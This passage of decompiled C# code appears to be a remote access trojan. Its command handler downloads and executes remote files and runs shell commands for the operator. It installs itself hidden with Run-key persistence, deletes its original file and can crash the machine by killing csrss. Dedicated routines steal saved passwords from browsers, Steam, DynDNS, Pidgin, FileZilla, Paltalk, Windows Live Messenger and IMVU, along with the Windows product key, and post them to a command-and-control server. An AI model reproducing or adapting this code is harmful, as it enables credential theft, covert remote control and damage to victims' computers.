						((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1], Path.GetTempPath() + text8);
						string lpReturnString = Path.GetTempPath() + text8;
						SystemParametersInfoA(20, 0, ref lpReturnString, 1);
						UpdateStatus("Changed Background");
					}
					else if (Operators.CompareString(text, Conversions.ToString(45), false) == 0)
					{
						Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
						UpdateStatus("Command Executed");
					}
					else if (Operators.CompareString(text, Conversions.ToString(46), false) == 0)
					{
						Opera opera = new Opera();
						opera.GetOpera();
						GetChrome();
						UpdateStatus("Sent B. Passwords");
					}
					else if (Operators.CompareString(text, Conversions.ToString(47), false) == 0)
					{
						string[] array9 = Strings.Split(array[1], "#SPLIT#", -1, (CompareMethod)0);
						Password = array9[1];
						Weburl = array9[0];
						UpdateStatus("Redirection Succes");
						RegisterMe();
					}
					else if (Operators.CompareString(text, Conversions.ToString(48), false) == 0)
					{
						string text9 = array[1].Substring(array[1].LastIndexOf("/") + 1).ToString();
						((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1], Path.GetTempPath() + "exp" + text9);
						UpdateStatus("Update Succesfull");
						Process.Start(Path.GetTempPath() + "exp" + text9);
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(StartupName, throwOnMissingValue: false);
						MeltFile();
					}
					else if (Operators.CompareString(text, Conversions.ToString(49), false) == 0)
					{
						UpdateStatus("PC Standbyed");
						Application.SetSuspendState((PowerState)0, true, true);
					}
					else if (Operators.CompareString(text, Conversions.ToString(50), false) == 0)
					{
						SendKeys.SendWait("{ESC}");
						UpdateStatus("Screensaver Stopped");
					}
					else if (Operators.CompareString(text, Conversions.ToString(51), false) == 0)
					{
						int desktopWindow = GetDesktopWindow();
						SendMessage(desktopWindow, 274u, 61760u, 0);
						UpdateStatus("Screensaver Started");
					}
					else if (Operators.CompareString(text, Conversions.ToString(52), false) == 0)
					{
						UpdateStatus("DdoSing");
					}
					else if (Operators.CompareString(text, Conversions.ToString(53), false) == 0)
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(array[1], throwOnMissingValue: false);
						UpdateStatus("Deleted Entry");
					}
					else if (Operators.CompareString(text, Conversions.ToString(54), false) == 0)
					{
						string text10 = Conversions.ToString(Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(array[1]));
						Process.Start(text10.Replace('"', '\0').Replace(" ", null));
						UpdateStatus("Process Started");
					}
					else if (Operators.CompareString(text, Conversions.ToString(55), false) == 0)
					{
						string text11 = null;
						RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
						int num2 = registryKey.GetValueNames().Length - 1;
						for (int i = 0; i <= num2; i++)
						{
							if (Operators.CompareString(registryKey.GetValueNames()[i].ToString(), "-", false) != 0)
							{
								text11 = Conversions.ToString(Operators.AddObject((object)text11, Operators.AddObject(Operators.AddObject((object)(registryKey.GetValueNames()[i].ToString() + "}"), registryKey.GetValue(registryKey.GetValueNames()[i].ToString())), (object)"#")));
							}
						}
						SinCommand("startup=" + text11.Replace("\\", ">") + "&unid=" + UniqueID, "system/_strup.php");
						UpdateStatus("Startup Sent");
					}
					else if (Operators.CompareString(text, Conversions.ToString(56), false) == 0)
					{
						string text12 = null;
						foreach (AppInfo installedApp in GetInstalledApps())
						{
							if (installedApp.UnInstallPath != null)
							{
								text12 = text12 + installedApp.Name + "^";
								text12 = text12 + installedApp.UnInstallPath.Replace("\"", "") + "^";
								text12 = text12 + installedApp.SilentUnInstallPath + "#";
							}
						}
						SinCommand("apps=" + text12.Replace("\\", ">") + "&unid=" + UniqueID, "system/_prglst.php");
						UpdateStatus("Sent Programlist");
					}
					else if (Operators.CompareString(text, Conversions.ToString(57), false) == 0)
					{
						Process.Start(array[1]);
						UpdateStatus("Uninstallation started");
					}
					else if (Operators.CompareString(text, Conversions.ToString(58), false) == 0)
					{
						Process.Start(array[1].Replace(" ", null));
						UpdateStatus("Silent Uninstallation started");
					}
					else if (Operators.CompareString(text, Conversions.ToString(928415), false) == 0)
					{
						UpdateStatus("Crashed PC!!");
						Process.EnterDebugMode();
						Process[] processes = Process.GetProcesses();
						Process[] array10 = processes;
						foreach (Process process2 in array10)
						{
							if (Operators.CompareString(process2.ProcessName, "csrss", false) == 0)
							{
								process2.Kill();
								process2.WaitForExit();
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(process2.MainModule!.FileName);
							}
						}
						Process.LeaveDebugMode();
					}
					Thread.Sleep(2000);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					Thread.Sleep(2000);
					UpdateStatus("ERROR");
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	public static void Installme()
	{
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected I4, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected I4, but got Unknown
		try
		{
			if (!Directory.Exists(Location))
			{
				Directory.CreateDirectory(Location);
			}
			if (Operators.CompareString(Application.get_ExecutablePath(), Location + Filename, false) != 0)
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(StartupName, Location + Filename);
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Location + Filename);
				FileAttribute val = (FileAttribute)checked(val + 7);
				File.SetAttributes(Location + Filename, (FileAttributes)val);
				File.SetAttributes(Location, (FileAttributes)val);
				Process.Start(Location + Filename);
				MeltFile();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Process.Start(Location + Filename);
			MeltFile();
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	public static void GetSteamUsername()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string[] array = default(string[]);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 215:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002f;
						case 4:
							goto IL_003e;
						case 5:
							goto IL_0064;
						case 6:
							goto IL_0079;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
						case 9:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0079:
					num = 6;
					array[9] = array[9];
					break;
					IL_0008:
					num = 2;
					text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "SteamPath", (object)""));
					goto IL_002f;
					IL_002f:
					num = 3;
					text2 = text + "\\config\\SteamAppData.vdf";
					goto IL_003e;
					IL_003e:
					num = 4;
					array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(text2).Split(new char[1] { '"' });
					goto IL_0064;
					IL_0064:
					num = 5;
					if (Operators.CompareString(array[9], "", false) == 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_0079;
					end_IL_0000_2:
					break;
				}
				num = 7;
				Stealme("Steam", "-", array[9], "-");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 215;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static string DynDns()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		string text5 = default(string);
		string text6 = default(string);
		string text7 = default(string);
		int num6 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 696:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_000d;
						case 4:
							goto IL_0013;
						case 5:
							goto IL_0019;
						case 6:
							goto IL_001f;
						case 7:
							goto IL_002d;
						case 8:
							goto IL_0045;
						case 9:
						case 10:
							goto IL_0054;
						case 11:
							goto IL_0065;
						case 12:
							goto IL_0082;
						case 15:
							goto IL_0095;
						case 16:
							goto IL_009c;
						case 17:
							goto IL_00a8;
						case 18:
							goto IL_00c3;
						case 19:
						case 20:
							goto IL_00d2;
						case 13:
						case 14:
						case 23:
						case 24:
							goto IL_00ef;
						case 21:
							goto IL_00fd;
						case 22:
						case 25:
							goto IL_010c;
						case 26:
							goto IL_0124;
						case 27:
							goto IL_0135;
						case 28:
							goto IL_016a;
						case 29:
							goto IL_0177;
						case 30:
							goto IL_0188;
						case 31:
							goto IL_01c1;
						case 32:
							goto IL_01cb;
						case 33:
							goto IL_01d8;
						case 35:
							goto IL_01ea;
						case 36:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 34:
						case 37:
						case 38:
						case 39:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_016a:
					num = 28;
					num5 = checked(num5 + 2);
					goto IL_0172;
					IL_0008:
					num = 2;
					text = null;
					goto IL_000d;
					IL_000d:
					num = 3;
					text2 = null;
					goto IL_0013;
					IL_0013:
					num = 4;
					text3 = null;
					goto IL_0019;
					IL_0019:
					num = 5;
					text4 = null;
					goto IL_001f;
					IL_001f:
					num = 6;
					text5 = Interaction.Environ("ALLUSERSPROFILE");
					goto IL_002d;
					IL_002d:
					num = 7;
					if (Operators.CompareString(Strings.Right(text5, 1), "\\", false) != 0)
					{
						goto IL_0045;
					}
					goto IL_0054;
					IL_0045:
					num = 8;
					text5 += "\\";
					goto IL_0054;
					IL_0054:
					num = 10;
					text6 = text5 + "DynDNS\\Updater\\config.dyndns";
					goto IL_0065;
					IL_0065:
					num = 11;
					if (Operators.CompareString(FileSystem.Dir(text6, (FileAttribute)0), "", false) == 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_0082;
					IL_0082:
					num = 12;
					FileSystem.FileOpen(1, text6, (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
					goto IL_00ef;
					IL_00ef:
					num = 14;
					if (!FileSystem.EOF(1))
					{
						goto IL_0095;
					}
					goto IL_010c;
					IL_0095:
					num = 15;
					text7 = null;
					goto IL_009c;
					IL_009c:
					num = 16;
					text7 = FileSystem.LineInput(1);
					goto IL_00a8;
					IL_00a8:
					num = 17;
					if (Operators.CompareString(Strings.Left(text7, 9), "Username=", false) == 0)
					{
						goto IL_00c3;
					}
					goto IL_00d2;
					IL_00c3:
					num = 18;
					text2 = Strings.Mid(text7, 10);
					goto IL_00d2;
					IL_00d2:
					num = 20;
					if (Operators.CompareString(Strings.Left(text7, 9), "Password=", false) != 0)
					{
						goto IL_00ef;
					}
					goto IL_00fd;
					IL_00fd:
					num = 21;
					text3 = Strings.Mid(text7, 10);
					goto IL_010c;
					IL_010c:
					num = 25;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_0124;
					IL_0124:
					num = 26;
					num6 = Strings.Len(text3);
					num5 = 1;
					goto IL_0172;
					IL_0172:
					if (num5 <= num6)
					{
						goto IL_0135;
					}
					goto IL_0177;
					IL_0177:
					num = 29;
					num7 = Strings.Len(text4);
					num5 = 1;
					goto IL_01d3;
					IL_01d3:
					if (num5 <= num7)
					{
						goto IL_0188;
					}
					goto IL_01d8;
					IL_01d8:
					num = 33;
					if (Operators.CompareString(text2, (string)null, false) == 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_01ea;
					IL_01ea:
					num = 35;
					break;
					IL_0188:
					num = 30;
					StringType.MidStmtStr(ref text4, num5, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(text4, num5, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", checked(num8 + 1), 1)))));
					goto IL_01c1;
					IL_01c1:
					num = 31;
					num8 = checked(num8 + 1) % 8;
					goto IL_01cb;
					IL_01cb:
					num = 32;
					num5 = checked(num5 + 1);
					goto IL_01d3;
					IL_0135:
					num = 27;
					text4 += Conversions.ToString(Strings.Chr(checked((int)Math.Round(Conversion.Val("&H" + Strings.Mid(text3, num5, 2))))));
					goto IL_016a;
					end_IL_0000_2:
					break;
				}
				num = 36;
				Stealme("DynDNS", "-", text2, text4);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 696;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void Pidgin()
	{
		XmlDocument xmlDocument = new XmlDocument();
		string text = Interaction.Environ("appdata") + "\\.purple\\accounts.xml";
		if (!File.Exists(text))
		{
			return;
		}
		checked
		{
			try
			{
				xmlDocument.Load(text);
				XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("protocol");
				XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("name");
				XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("password");
				int num = elementsByTagName.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					Stealme("Pidgin", "-", elementsByTagName2[i]!.InnerText, elementsByTagName3[i]!.InnerText);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void FileZilla()
	{
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml");
			XmlNodeList xmlNodeList = xmlDocument.SelectNodes("/FileZilla3/Settings/LastServer");
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = xmlNodeList.GetEnumerator();
				while (enumerator.MoveNext())
				{
					XmlNode xmlNode = (XmlNode)enumerator.Current;
					try
					{
						string innerText = xmlNode.ChildNodes.Item(0)!.InnerText;
						string innerText2 = xmlNode.ChildNodes.Item(4)!.InnerText;
						string innerText3 = xmlNode.ChildNodes.Item(5)!.InnerText;
						Stealme("FileZilla", innerText, innerText2, innerText3);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static string GetHDSerial()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("Win32_LogicalDisk.DeviceID=\"C:\"");
		PropertyData val2 = ((ManagementBaseObject)val).get_Properties().get_Item("VolumeSerialNumber");
		return val2.get_Value().ToString();
	}

	public static void PaltalkScene()
	{
		checked
		{
			try
			{
				char[] array = GetHDSerial().ToCharArray();
				RegistryKey currentUser = Registry.CurrentUser;
				string text = "";
				currentUser = Registry.CurrentUser.OpenSubKey("Software\\Paltalk");
				string[] subKeyNames = currentUser.GetSubKeyNames();
				currentUser.Close();
				string[] array2 = subKeyNames;
				int num = default(int);
				int num2 = default(int);
				int num3 = default(int);
				foreach (string text2 in array2)
				{
					string text3 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Paltalk\\" + text2, "pwd", ""));
					char[] array3 = text3.ToCharArray();
					string[] array4 = new string[(int)Math.Round((double)text3.Length / 4.0) + 1];
					while (num <= Information.UBound((Array)array3, 1) - 4)
					{
						if (num < Information.UBound((Array)array3, 1) - 4)
						{
							array4[num2] = Conversions.ToString(array3[num]) + Conversions.ToString(array3[num + 1]) + Conversions.ToString(array3[num + 2]);
						}
						num += 4;
						num2++;
					}
					string text4 = "";
					string text5 = text2;
					int j = 0;
					for (int length = text5.Length; j < length; j++)
					{
						char c = text5[j];
						text4 += Conversions.ToString(c);
						if (num3 <= Information.UBound((Array)array, 1))
						{
							text4 += Conversions.ToString(array[num3]);
						}
						num3++;
					}
					text4 = text4 + text4 + text4;
					char[] array5 = text4.ToCharArray();
					string text6 = "";
					text6 += Conversions.ToString(Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[0]) - 122.0 - (double)Strings.Asc(text4.Substring(text4.Length - 1, 1)))));
					int num4 = Information.UBound((Array)array4, 1);
					for (int k = 1; k <= num4; k++)
					{
						if (array4[k] != null)
						{
							char c2 = Strings.Chr((int)Math.Round(Conversions.ToDouble(array4[k]) - (double)k - (double)Strings.Asc(array5[k - 1]) - 122.0));
							text6 += Conversions.ToString(c2);
						}
					}
					text = text + "Username: " + text2 + "\r\nPassword: " + text6 + "\r\n\r\n";
					Stealme("Paltalk", "-", text2, text6);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, int szDataDescr, int pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

	[DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool CredEnumerate(string filter, int flag, ref int count, ref IntPtr pCredentials);

	public static void WindowsLiveMessenger()
	{
		checked
		{
			try
			{
				int count = 0;
				IntPtr pCredentials = IntPtr.Zero;
				IntPtr[] array = null;
				if (CredEnumerate("WindowsLive:name=*", 0, ref count, ref pCredentials))
				{
					array = new IntPtr[count - 1 + 1];
					IntPtr intPtr = pCredentials;
					int num = count - 1;
					for (int i = 0; i <= num; i++)
					{
						ref IntPtr reference = ref array[i];
						reference = Marshal.ReadIntPtr((IntPtr)(intPtr.ToInt32() + IntPtr.Size * i));
						CREDENTIAL cREDENTIAL = (CREDENTIAL)Marshal.PtrToStructure(array[i], typeof(CREDENTIAL));
						DATA_BLOB pDataIn = default(DATA_BLOB);
						DATA_BLOB pDataOut = default(DATA_BLOB);
						pDataIn.pbData = cREDENTIAL.lpbCredentialBlob;
						pDataIn.cbData = cREDENTIAL.dwCredentialBlobSize;
						CryptUnprotectData(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
						string pass = Marshal.PtrToStringAuto(pDataIn.pbData);
						Stealme("WLM Messenger", "-", Marshal.PtrToStringAuto(cREDENTIAL.lpUserName), pass);
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static object ReadKey(ref string hKey)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		object obj;
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.shell", ""));
					object[] array = new object[1] { hKey };
					bool[] array2 = new bool[1] { true };
					object obj2 = NewLateBinding.LateGet(objectValue, (Type)null, "regread", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						hKey = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					obj = RuntimeHelpers.GetObjectValue(obj2);
					goto end_IL_0000;
				}
				case 121:
					num = -1;
					switch (num2)
					{
					case 2:
						obj = null;
						goto end_IL_0000;
					}
					break;
				}
				goto IL_00b3;
				end_IL_0000:;
			}
			catch (object obj3) when (obj3 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj3);
				try0000_dispatch = 121;
				continue;
			}
			break;
			IL_00b3:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		object result = obj;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string Hex2Ascii(string Text)
	{
		object obj = null;
		object obj2 = default(object);
		object obj3 = default(object);
		if (ForLoopControl.ForLoopInitObj(obj2, (object)1, (object)Strings.Len(Text), (object)1, ref obj3, ref obj2))
		{
			do
			{
				object obj4 = Strings.Mid(Text, Conversions.ToInteger(obj2), 2);
				obj = Operators.ConcatenateObject(obj, (object)Strings.Chr(checked((int)Math.Round(Conversion.Val(Operators.ConcatenateObject((object)"&h", obj4))))));
				obj2 = Operators.AddObject(obj2, (object)1);
			}
			while (ForLoopControl.ForNextCheckObj(obj2, obj3, ref obj2));
		}
		return Conversions.ToString(obj);
	}

	public static void Imvu()
	{
		string hKey = "HKEY_CURRENT_USER\\Software\\IMVU\\username\\";
		string hKey2 = "HKEY_CURRENT_USER\\Software\\IMVU\\password\\";
		if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(ReadKey(ref hKey), (object)null, false))))
		{
			Stealme("Imvu Messenger", "-", Conversions.ToString(ReadKey(ref hKey)), Hex2Ascii(Conversions.ToString(ReadKey(ref hKey2))));
		}
	}

	public static void StealBrowsers(string type, string host, string user, string pass)
	{
		SinCommand("type=" + type + "&host=" + host + "&user=" + user + "&pass=" + pass + "&unid=" + UniqueID, "system/_brg.php");
	}

	public static void Stealme(string type, string host, string user, string pass)
	{
		SinCommand("type=" + type + "&host=" + host + "&user=" + user + "&pass=" + pass + "&unid=" + UniqueID, "system/_prg.php");
	}

	public static string AccountType()
	{
		if (MyProject.User.IsInRole(Environment.MachineName + "\\" + Environment.UserName))
		{
			return "Administrator";
		}
		return "Limited";
	}

	public static string defaultbrowser()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object)"Not Found"));
		string[] array = Strings.Split(text, "\"", -1, (CompareMethod)0);
		return Path.GetFileNameWithoutExtension(array[1]);
	}

	public static void KickHisAss(string Bitch)
	{
		checked
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				int num = processes.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase(Bitch), false) == 0)
					{
						processes[i].Kill();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static MessageBoxButtons msgbuttons(string input)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		MessageBoxButtons result = (MessageBoxButtons)0;
		if (Conversions.ToDouble(input) == 1.0)
		{
			return (MessageBoxButtons)2;
		}
		if (Conversions.ToDouble(input) == 2.0)
		{
			return (MessageBoxButtons)0;
		}
		if (Conversions.ToDouble(input) == 3.0)
		{
			return (MessageBoxButtons)1;
		}
		if (Conversions.ToDouble(input) == 4.0)
		{
			return (MessageBoxButtons)5;
		}
		if (Conversions.ToDouble(input) == 5.0)
		{
			return (MessageBoxButtons)4;
		}
		if (Conversions.ToDouble(input) == 6.0)
		{
			return (MessageBoxButtons)3;
		}
		return result;
	}

	public static MessageBoxIcon msgicons(string input)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		MessageBoxIcon result = (MessageBoxIcon)0;
		if (Conversions.ToDouble(input) == 1.0)
		{
			return (MessageBoxIcon)48;
		}
		if (Conversions.ToDouble(input) == 2.0)
		{
			return (MessageBoxIcon)16;
		}
		if (Conversions.ToDouble(input) == 3.0)
		{
			return (MessageBoxIcon)64;
		}
		if (Conversions.ToDouble(input) == 4.0)
		{
			return (MessageBoxIcon)32;
		}
		return result;
	}

	public static string GetProductKey(string KeyPath, string ValueName)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)MyProject.Computer).get_Registry().GetValue(KeyPath, ValueName, (object)0));
		if (objectValue == null)
		{
			return "N/A";
		}
		string text = "";
		int num = Information.LBound((Array)objectValue, 1);
		int num2 = Information.UBound((Array)objectValue, 1);
		checked
		{
			for (int i = num; i <= num2; i++)
			{
				text = text + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1] { i }, (string[])null)));
			}
			int num3 = 52;
			string[] array = new string[25]
			{
				"B", "C", "D", "F", "G", "H", "J", "K", "M", "P",
				"Q", "R", "T", "V", "W", "X", "Y", "2", "3", "4",
				"6", "7", "8", "9", null
			};
			int num4 = 29;
			int num5 = 15;
			string[] array2 = new string[16];
			string[] array3 = new string[31];
			string text2 = "";
			int num6 = 67;
			for (int j = 52; j <= num6; j++)
			{
				array2[j - num3] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1] { j }, (string[])null));
				text2 = text2 + " " + Conversion.Hex((object)array2[j - num3]);
			}
			string text3 = "";
			for (int k = num4 - 1; k >= 0; k += -1)
			{
				int num7;
				unchecked
				{
					if (checked(k + 1) % 6 == 0)
					{
						array3[k] = "-";
						text3 += "-";
						continue;
					}
					num7 = 0;
				}
				for (int l = num5 - 1; l >= 0; l += -1)
				{
					int num8 = (int)((long)Math.Round((double)num7 * 256.0) | Conversions.ToLong(array2[l]));
					unchecked
					{
						array2[l] = Conversions.ToString(num8 / 24);
						num7 = num8 % 24;
					}
				}
				array3[k] = array[num7];
				text3 += array[num7];
			}
			return Strings.StrReverse(text3);
		}
	}

	public static void Winserial()
	{
		string productKey = GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId");
		SinCommand("os=" + os + "&wkey=" + productKey, "system/_wkey.php");
	}

	public static void SinCommand(string Input, string output)
	{
		try
		{
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			Encoding.ASCII.GetBytes(Input);
			byte[] bytes = aSCIIEncoding.GetBytes(Input);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Weburl + output);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			new StreamReader(httpWebResponse.GetResponseStream());
			requestStream.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string delegateproces()
	{
		string text = null;
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			text = text + process.ProcessName.ToString() + "}" + process.Id + "}" + process.MainWindowTitle.ToString() + "#";
		}
		return text;
	}

	private static string Random1()
	{
		string text = null;
		Random random = new Random();
		int num = 0;
		checked
		{
			do
			{
				text += Conversions.ToString("abcdefghijklmnopqrstuvwxyz1234567890"[random.Next(0, "abcdefghijklmnopqrstuvwxyz1234567890".Length - 1)]);
				num++;
			}
			while (num <= 31);
			return text;
		}
	}

	public static string ReadMain()
	{
		try
		{
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			string s = "uniD=" + UniqueID + "&password=" + Password;
			Encoding.ASCII.GetBytes(s);
			byte[] bytes = aSCIIEncoding.GetBytes(s);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Weburl + "system/_read.php");
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = bytes.Length;
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			requestStream.Close();
			return streamReader.ReadToEnd();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void RegisterMe()
	{
		SinCommand("ID=" + ID + "&UserPC=" + UserPC + "&OperatingSystem=" + os + "&UniqueID=" + UniqueID + "&Country=" + country + "&password=" + Password, "system/_reg.php");
	}

	public static void UpdateStatus(string update)
	{
		SinCommand("uniD=" + UniqueID + "&status=" + update + "&password=" + Password, "system/_sts.php");
